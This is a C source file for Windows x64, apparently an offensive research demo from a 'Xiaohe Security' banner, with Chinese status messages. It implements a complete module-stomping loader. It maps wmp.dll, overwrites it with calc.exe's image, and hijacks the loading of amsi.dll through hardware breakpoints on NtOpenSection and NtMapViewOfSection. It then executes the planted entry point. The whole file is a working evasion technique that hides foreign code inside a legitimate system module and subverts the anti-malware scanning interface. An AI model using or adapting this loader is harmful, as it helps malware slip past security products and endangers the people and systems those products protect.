#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>

#if defined(_WIN32) && !defined(_WIN64)
#error This project must be compiled as 64-bit (x64). 32-bit build is not supported.
#endif

#define CTX_FLAGS (CONTEXT_DEBUG_REGISTERS)
#define DR_TYPE   UINT64

typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSYSAPI NTSTATUS NTAPI NtOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtContinue(PCONTEXT ContextRecord, BOOLEAN TestAlert);
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, PLARGE_INTEGER MaximumSize OPTIONAL, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle OPTIONAL);
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset OPTIONAL, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

enum LdrState
{
    StateOpenSection = 0,
    StateMapViewOfSection,
    StateClose
};

LdrState gLdrState = LdrState::StateOpenSection;
SIZE_T gViewSize = 0;
PVOID gBaseAddress = NULL;
HANDLE gSectionHandle = NULL;

BOOL SetHardwareBreakpoint(const PVOID address, PCONTEXT ctx)
{
    if (ctx)
    {
        ctx->Dr7 = 1LL;
        ctx->Dr0 = (DWORD64)address;
        NtContinue(ctx, FALSE);
    }
    else
    {
        // Default to current thread if no context was given
        CONTEXT context = { 0 };
        context.ContextFlags = CTX_FLAGS;

        HANDLE hThread = GetCurrentThread();

        if (!GetThreadContext(hThread, &context))
            return FALSE;

        context.Dr7 = 1;
        context.Dr0 = (DWORD64)address;

        if (!SetThreadContext(hThread, &context))
            return FALSE;
    }
    return TRUE;
}

LONG InjectHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
    {
        CONTEXT* ctx = ExceptionInfo->ContextRecord;

        switch (gLdrState)
        {
        case LdrState::StateOpenSection:
        {
            printf("触发NtOpenSection断点\r\n");

            *(PHANDLE)ctx->Rcx = gSectionHandle;

            ctx->Rax = 0;
            BYTE* rip = (BYTE*)ctx->Rip;
            while (*rip != 0xC3) ++rip;
            ctx->Rip = (ULONG_PTR)(rip);

            gLdrState = LdrState::StateMapViewOfSection;
            SetHardwareBreakpoint((PVOID)NtMapViewOfSection, ctx);
            NtContinue(ctx, FALSE);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        break;

        case LdrState::StateMapViewOfSection:
        {
            printf("触发NtMapViewOfSection断点\r\n");
            if ((HANDLE)ctx->Rcx != gSectionHandle)
                return EXCEPTION_CONTINUE_EXECUTION;
            printf("确认拦截到wmp.dll句柄\r\n");

            PVOID* baseAddrPtr = (PVOID*)ctx->R8;
            PSIZE_T viewSizePtr = *(PSIZE_T*)(ctx->Rsp + 0x38);
            ULONG* allocTypePtr = (ULONG*)(ctx->Rsp + 0x48);
            ULONG* protectPtr = (ULONG*)(ctx->Rsp + 0x50);

            if (baseAddrPtr)
                *baseAddrPtr = gBaseAddress;
            if (viewSizePtr)
                *viewSizePtr = gViewSize;

            *allocTypePtr = 0;
            *protectPtr = PAGE_EXECUTE_READWRITE;

            ctx->Rax = 0;
            BYTE* rip = (BYTE*)ctx->Rip;
            while (*rip != 0xC3) ++rip;
            ctx->Rip = (ULONG_PTR)(rip);

            ctx->Dr0 = 0LL;
            ctx->Dr1 = 0LL;
            ctx->Dr2 = 0LL;
            ctx->Dr3 = 0LL;
            ctx->Dr6 = 0LL;
            ctx->Dr7 = 0LL;
            ctx->EFlags |= 0x10000u;

            NtContinue(ctx, FALSE);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        break;
        }
    }
    
    // 添加默认返回值
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL 
ApplyRelocations(
    PBYTE base, 
    SIZE_T imageSize, 
    ULONGLONG newBase, 
    ULONGLONG oldBase
)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);

    ULONGLONG delta = newBase - nt->OptionalHeader.ImageBase;
    if (!delta)
        return TRUE;

    IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir.VirtualAddress || !relocDir.Size)
        return TRUE;

    SIZE_T processed = 0;
    PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)(base + relocDir.VirtualAddress);

    while (processed < relocDir.Size && block->SizeOfBlock)
    {
        DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entry = (WORD*)((PBYTE)block + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < count; i++, entry++)
        {
            WORD type = *entry >> 12;
            WORD offset = *entry & 0xFFF;
            BYTE* patchAddr = base + block->VirtualAddress + offset;

            if (type == IMAGE_REL_BASED_HIGHLOW)
                *(DWORD*)patchAddr += (DWORD)delta;
            else if (type == IMAGE_REL_BASED_DIR64)
                *(ULONGLONG*)patchAddr += delta;
        }
        processed += block->SizeOfBlock;
        block = (PIMAGE_BASE_RELOCATION)((PBYTE)block + block->SizeOfBlock);
    }
    return TRUE;
}

BOOL 
CopyImageSections(
    PBYTE sourceBuffer, 
    PVOID baseAddress, 
    SIZE_T viewSize
)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)sourceBuffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(sourceBuffer + dos->e_lfanew);

    // Copy headers
    SIZE_T headersSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(baseAddress, sourceBuffer, headersSize);

    // Copy sections
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if (sec->SizeOfRawData == 0)
            continue;

        BYTE* dst = (BYTE*)baseAddress + sec->VirtualAddress;
        BYTE* src = sourceBuffer + sec->PointerToRawData;
        SIZE_T size = sec->SizeOfRawData;

        if ((sec->VirtualAddress + size) > viewSize)
            size = viewSize - sec->VirtualAddress;

        memcpy(dst, src, size);
    }
    return TRUE;
}

BOOL 
ApplySectionProtections(
    PVOID baseAddress
)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress + dos->e_lfanew);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        DWORD protect;
        DWORD old;

        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)
        {
            if (sec->Characteristics & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_EXECUTE_READWRITE;
            else if (sec->Characteristics & IMAGE_SCN_MEM_READ)
                protect = PAGE_EXECUTE_READ;
            else
                protect = PAGE_EXECUTE;
        }
        else
        {
            if (sec->Characteristics & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_READWRITE;
            else if (sec->Characteristics & IMAGE_SCN_MEM_READ)
                protect = PAGE_READONLY;
            else
                protect = PAGE_NOACCESS;
        }

        PVOID addr = (BYTE*)baseAddress + sec->VirtualAddress;
        SIZE_T size = sec->Misc.VirtualSize;
        if (!size)
            size = sec->SizeOfRawData;

        VirtualProtect(addr, size, protect, &old);
    }
    return TRUE;
}

int 
main()
{
    system("chcp 65001 > nul");
    printf("\n");
    printf("  ******************************\n");
    printf("  *        小和安全             *\n");
    printf("  *      Xiaohe Security        *\n");
    printf("  ******************************\n");
    printf("\n");
    
    DWORD oldProt;
    DWORD bytesRead;

    HANDLE hCalc = CreateFileW(L"C:\\Windows\\System32\\calc.exe", GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hCalc == INVALID_HANDLE_VALUE)
    {
        printf("打开calc.exe文件失败!\n");
        return 1;
    }
    DWORD fileSize = GetFileSize(hCalc, NULL);
    BYTE* pTargetPeBuf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);
    ReadFile(hCalc, pTargetPeBuf, fileSize, &bytesRead, NULL);
    CloseHandle(hCalc);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pTargetPeBuf;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pTargetPeBuf + dos->e_lfanew);

    DWORD entrypoint_offset = nt->OptionalHeader.AddressOfEntryPoint;
    if (!(nt->FileHeader.Characteristics & IMAGE_FILE_DLL))
    {
        nt->FileHeader.Characteristics |= IMAGE_FILE_DLL;
        nt->OptionalHeader.AddressOfEntryPoint = 0;
    }

    HANDLE hWmp = CreateFileW(L"C:\\Windows\\system32\\wmp.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hWmp == INVALID_HANDLE_VALUE)
    {
        printf("打开wmp.dll文件失败!\n");
        return 1;
    }

    NTSTATUS status = NtCreateSection(&gSectionHandle, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hWmp);
    CloseHandle(hWmp);
    if (status < 0)
    {
        printf("NtCreateSection创建wmp.dll的节对象失败,错误码: 0x%08X\n", status);
        return 1;
    }

    status = NtMapViewOfSection(gSectionHandle, GetCurrentProcess(), &gBaseAddress, 0, 0, NULL, &gViewSize, ViewShare, 0, PAGE_READWRITE);
    if (status < 0)
    {
        printf("NtMapViewOfSection映射wmp.dll到内存中失败,错误码: 0x%08X\n", status);
        return 1;
    }

    VirtualProtect(gBaseAddress, nt->OptionalHeader.SizeOfImage, PAGE_READWRITE, &oldProt);
    memset(gBaseAddress, 0, nt->OptionalHeader.SizeOfImage);

    CopyImageSections(pTargetPeBuf, gBaseAddress, gViewSize);
    HeapFree(GetProcessHeap(), 0, pTargetPeBuf);

    ApplyRelocations((PBYTE)gBaseAddress, nt->OptionalHeader.SizeOfImage, (ULONGLONG)gBaseAddress, nt->OptionalHeader.ImageBase);
    ApplySectionProtections(gBaseAddress);

    printf("内存基址: %p\n", gBaseAddress);
    printf("内存区域大小: %zu\n", gViewSize);
    printf("wmp.dll节对象句柄: %p\n", gSectionHandle);

    PVOID handler = AddVectoredExceptionHandler(1u, (PVECTORED_EXCEPTION_HANDLER)InjectHandler);
    SetHardwareBreakpoint((PVOID)NtOpenSection, NULL);

    HMODULE base = LoadLibraryW(L"amsi.dll");
    if (!base)
    {
        printf("加载amsi.dll失败\n");
        return 1;
    }
    printf("加载amsi.dll成功,地址: 0x%llx\r\n", base);

    if (handler)
        RemoveVectoredExceptionHandler(handler);

    PVOID entryPoint = (BYTE*)gBaseAddress + entrypoint_offset;
    printf("PE文件入口点: %p\n", entryPoint);
    ((void (*)())entryPoint)();
    return 0;
}